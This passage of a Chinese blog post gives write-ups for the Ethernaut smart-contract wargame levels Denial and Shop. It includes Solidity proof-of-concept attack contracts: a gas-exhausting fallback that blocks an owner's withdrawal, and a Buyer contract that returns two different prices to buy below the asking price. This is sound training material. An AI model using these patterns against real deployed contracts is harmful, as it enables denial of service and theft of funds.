+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2914">ethernaut 题目Alien Codex write up</a>  </p>
+<p><a target="_blank" rel="noopener" href="http://mitah.cn/index.php/archives/14/">Zeppelin Ethernaut writeup</a> </p>
+<h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><p>通关条件：</p>
+<ul>
+<li>在调用withdraw的时候，禁止owner分走账户的1%余额。</li>
+</ul>
+<blockquote>
+<p>address.call.value(x)() 可以向合约发送更多的gas</p>
+<p>assert(0&#x3D;&#x3D;1) 触发异常之后会消耗所有可用的 gas </p>
+</blockquote>
+<p>​	要使owner.transfer(amountToSend)执行失败，就需要使owner报错或者前面的语句将gas消耗完。很明显，在这里我们只能让前面的语句把gas消耗完来阻止owner提钱。</p>
+<p>​	partner默认没有赋值，这正好给了我们利用途径。新建一个合约：</p>
+<pre><code>pragma solidity &gt;=0.4.22 &lt;0.6.0;
+contract attack&#123;
+    function() payable&#123;
+        assert(0==1);
+    &#125;
+&#125;
+</code></pre>
+<p>​	将partner赋值：</p>
+<pre><code>contract.setWithdrawPartner(&quot;0xD8Da635f4c5356942AbF3A1C67194E44C3F80a8f&quot;)
+</code></pre>
+<p>​	然后调用withdraw()：</p>
+<pre><code>contract.withdraw()
+</code></pre>
+<p>​	这里就要小小回顾下，要阻止转账的成功，这里提到的有两个方式：</p>
+<ul>
+<li>在其调用转账代码之前将gas消耗完毕</li>
+<li>转账目标主动抛出异常</li>
+</ul>
+<p>关键：</p>
+<ul>
+<li>assert()失败耗费所有gas</li>
+</ul>
+<h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><blockquote>
+<p>​	404 Not found ╮(╯▽╰)╭我也想做，可是它是404啊！</p>
+</blockquote>
+<p>11.22 更新！Ethernaut终于更新了！全（chuan）新版本——0.5.0现已上线。</p>
+<p>通过条件：</p>
+<ul>
+<li>最终价格低于叫价</li>
+</ul>
+<p>​	简单分析一波：</p>
+<pre><code>contract Shop &#123;
+  uint public price = 100;//初始价格
+  bool public isSold;
+
+  function buy() public &#123;
+    Buyer _buyer = Buyer(msg.sender);
+
+    if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) &#123;
+    //要满足这个条件，买家给出的价格要大于等于100，并且货物没有卖出
+      isSold = true;
+      price = _buyer.price.gas(3000)();
+    //将买家出的价格作为出售价格
+    &#125;
+  &#125;
+&#125;
+</code></pre>
+<p>​	问题很简单，只要使price() 两次返回不同的值即可，有很多方法可以办到，那么问题来了：应该根据什么判断应该返回哪个值呢。最开始我想的是设一个bool变量，在第一次被调用后修改该变量的值，第二次便可以返回不同的值：</p>
+<pre><code>//就像这样
+    bool public flag = false;
+
+    function price() external view returns (uint)&#123;
+        if (flag == true)&#123;
+            return 99;
+        &#125;
+        return 102;
+    &#125;
+</code></pre>
+<p>​	然而，编译都通不过！因为view这个修饰符的限定，我们不能修改状态，修改状态在官方文档中如是介绍：</p>
+<blockquote>
+<p>View 函数</p>
+<p>可以将函数声明为 <code>view</code> 类型，这种情况下要保证不修改状态。</p>
+<p>下面的语句被认为是修改状态：</p>
+<ol>
+<li>修改状态变量。</li>
+<li><a href="file:///C:/Users/xzy/Desktop/Work/solidity-中文文档/index.html#events">产生事件</a>。</li>
+<li>创建其它合约</li>
+<li>使用 <code>selfdestruct</code>。</li>
+<li>通过调用发送以太币。</li>
+<li>调用任何没有标记为 <code>view</code> 或者 <code>pure</code> 的函数。</li>
+<li>使用低级调用。</li>
+<li>使用包含特定操作码的内联汇编。</li>
+</ol>
+</blockquote>
+<p>​	所以我们得另寻他法，回到题目合约中，我们可以发现在第一次调用price() 的前后，布尔型变量isSold的值发生了改变，那么我们是不是可以通过它来作为判断条件：</p>
+<pre><code>    function price() external view returns (uint)&#123;
+        if (target.isSold() == true)&#123;
+            return 99;
+        &#125;
+        return 102;
+    &#125;
+</code></pre>
+<p>​	然而，编译是通过了，在调用函数的时候，Remix提示如下：</p>
+<blockquote>
+<p>Gas estimation failed</p>
+<p>Gas estimation errored with the following message (see below). The transaction execution will likely fail. Do you want to force sending?<br>gas required exceeds allowance (8000029) or always failing transaction</p>
+</blockquote>
+<p>​	这段话大概的意思就是无法估计gas的消耗，搜索一通后还是没有解决这个问题。</p>
+<p>​	后来在他人的帮助下才知道，不能使用变量作为判断条件，因为在执行判断之前还要去storage中访问target变量的值，这会消耗大量的gas，导致后面无法正常运行，从而失败。</p>
+<p><img src="img9.png"></p>
+<p>​	通过etherscan上的追踪，我们可以看到，失败的原因就是这里，访问storage需要消耗800gas，而此时没有那么多gas了。</p>
+<p>​	将target改为Shop(msg.sender) 就没有问题了，在if语句外面，我们已经使用了msg.sender，就不需要再次去访问storage，从而减少了gas的消耗。</p>
+<pre><code>    function price() external view returns (uint)&#123;
+        if (Shop(msg.sender).isSold() == true)&#123;
+            return 99;
+        &#125;
+        return 102;
+    &#125;
+&#125;
+</code></pre>
+<p>​	完整Poc：</p>
+<pre><code>pragma solidity ^0.5.0;
+
+contract Shop &#123;
+  uint public price = 100;
+  bool public isSold;
+
+  function buy() public &#123;
+    Buyer _buyer = Buyer(msg.sender);
+
+    if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) &#123;
+      isSold = true;
+      price = _buyer.price.gas(3000)();
+    &#125;
+  &#125;
+&#125;
+
+contract Buyer&#123;
+    
+    Shop target;
+    
+    function attack(address _addr) public&#123;
+        target = Shop(_addr);
+        target.buy();
+    &#125;
+    
+    function price() external view returns (uint)&#123;
+        if (Shop(msg.sender).isSold() == true)&#123;
+            return 99;
+        &#125;
+        return 102;
+    &#125;
+&#125;
+</code></pre>
+<p>​	price中的if语句还可以使用更加简单的方式写：</p>
+<pre><code>return Shop(msg.sender).isSold()?99:102;
+</code></pre>
+<p>关键：</p>
+<ul>
+<li>gas消耗的把握，访问storage会消耗大量的gas，如果gas有限，尽量避免访问storage</li>
+</ul>
+<p>做(chao)了好久好久好久，终于搞定了~~~~~~~</p>
+<p>​	完结撒花<em>★,°</em>:.☆(￣▽￣)&#x2F;$:<em>.°★</em> 。</p>
+<p>​	</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://shawnxu.me">Shawn Xu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://shawnxu.me/2019/11/09/Ethernaut%20WriteUp/">https://shawnxu.me/2019/11/09/Ethernaut%20WriteUp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://shawnxu.me" target="_blank">ShawnXu の 小窝</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Ethernaut/">Ethernaut</a><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/">安全</a><a class="post-meta__tags" href="/tags/solidity/">solidity</a></div><div class="post_share"><div class="social-share" data-image="/img/11.jpg" data-sites="twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2019/11/19/bypass-cdn/" title="信息收集——绕过CDN寻找真实IP"><img class="cover" src="/img/41.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">信息收集——绕过CDN寻找真实IP</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2019/11/19/bypass-cdn/" title="信息收集——绕过CDN寻找真实IP"><img class="cover" src="/img/41.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-11-19</div><div class="title">信息收集——绕过CDN寻找真实IP</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Shawn Xu</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/5hawnxu"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/5hawnxu" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:shawn@hxzy.me" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">吃饭睡觉打豆豆~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Zeppelin-Ethernaut-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">Zeppelin-Ethernaut-WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hello-Ethernaut"><span class="toc-number">1.1.</span> <span class="toc-text">Hello Ethernaut</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fallback"><span class="toc-number">1.2.</span> <span class="toc-text">Fallback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fallout"><span class="toc-number">1.3.</span> <span class="toc-text">Fallout</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Coin-Flip"><span class="toc-number">1.4.</span> <span class="toc-text">Coin Flip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telephone"><span class="toc-number">1.5.</span> <span class="toc-text">Telephone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token"><span class="toc-number">1.6.</span> <span class="toc-text">Token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Delegation"><span class="toc-number">1.7.</span> <span class="toc-text">Delegation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Force"><span class="toc-number">1.8.</span> <span class="toc-text">Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vault"><span class="toc-number">1.9.</span> <span class="toc-text">Vault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#King"><span class="toc-number">1.10.</span> <span class="toc-text">King</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re-entrancy"><span class="toc-number">1.11.</span> <span class="toc-text">Re-entrancy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Elevator"><span class="toc-number">1.12.</span> <span class="toc-text">Elevator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privacy"><span class="toc-number">1.13.</span> <span class="toc-text">Privacy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gatekeeper-One"><span class="toc-number">1.14.</span> <span class="toc-text">Gatekeeper One</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gatekeeper-Two"><span class="toc-number">1.15.</span> <span class="toc-text">Gatekeeper Two</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Naught-Coin"><span class="toc-number">1.16.</span> <span class="toc-text">Naught Coin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Preservation"><span class="toc-number">1.17.</span> <span class="toc-text">Preservation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Locked"><span class="toc-number">1.18.</span> <span class="toc-text">Locked</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recovery"><span class="toc-number">1.19.</span> <span class="toc-text">Recovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MagicNumber"><span class="toc-number">1.20.</span> <span class="toc-text">MagicNumber</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alien-Codex"><span class="toc-number">1.21.</span> <span class="toc-text">Alien Codex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Denial"><span class="toc-number">1.22.</span> <span class="toc-text">Denial</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shop"><span class="toc-number">1.23.</span> <span class="toc-text">Shop</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/04/hexo-themes/" title="一些看起来不错的主题"><img src="/img/15.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一些看起来不错的主题"/></a><div class="content"><a class="title" href="/2023/08/04/hexo-themes/" title="一些看起来不错的主题">一些看起来不错的主题</a><time datetime="2023-08-04T07:40:58.000Z" title="发表于 2023-08-04 15:40:58">2023-08-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/28/Register-accounts-by-email-in-batches/" title="邮箱验证类注册账户"><img src="/img/36.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="邮箱验证类注册账户"/></a><div class="content"><a class="title" href="/2021/11/28/Register-accounts-by-email-in-batches/" title="邮箱验证类注册账户">邮箱验证类注册账户</a><time datetime="2021-11-28T05:50:37.000Z" title="发表于 2021-11-28 13:50:37">2021-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/24/win11-and-wsa-install/" title="技嘉B365 Power安装win11及安卓子系统(WSA)"><img src="/img/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="技嘉B365 Power安装win11及安卓子系统(WSA)"/></a><div class="content"><a class="title" href="/2021/10/24/win11-and-wsa-install/" title="技嘉B365 Power安装win11及安卓子系统(WSA)">技嘉B365 Power安装win11及安卓子系统(WSA)</a><time datetime="2021-10-24T02:20:35.000Z" title="发表于 2021-10-24 10:20:35">2021-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/08/27/mess/" title="乱七八糟"><img src="/img/23.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="乱七八糟"/></a><div class="content"><a class="title" href="/2020/08/27/mess/" title="乱七八糟">乱七八糟</a><time datetime="2020-08-27T07:40:58.000Z" title="发表于 2020-08-27 15:40:58">2020-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/07/30/js-Synchronous-Asynchronous/" title="JavaScript同步、异步、回调"><img src="/img/11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JavaScript同步、异步、回调"/></a><div class="content"><a class="title" href="/2020/07/30/js-Synchronous-Asynchronous/" title="JavaScript同步、异步、回调">JavaScript同步、异步、回调</a><time datetime="2020-07-30T08:09:19.000Z" title="发表于 2020-07-30 16:09:19">2020-07-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2023 By Shawn Xu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://shawnxu.me">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>function loadWaline () {
+  function initWaline () {
+    const waline = Waline.init(Object.assign({
+      el: '#waline-wrap',
+      serverURL: 'https://commets-puce.vercel.app/',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      path: window.location.pathname,
+      comment: false,
+    }, null))
+  }
+
+  if (typeof Waline === 'object') initWaline()
+  else {
+    getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css').then(() => {
+      getScript('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js').then(initWaline)
+    })
+  }
+}
+
+if ('Waline' === 'Waline' || !false) {
+  if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+  else setTimeout(loadWaline, 0)
+} else {
+  function loadOtherComment () {
+    loadWaline()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
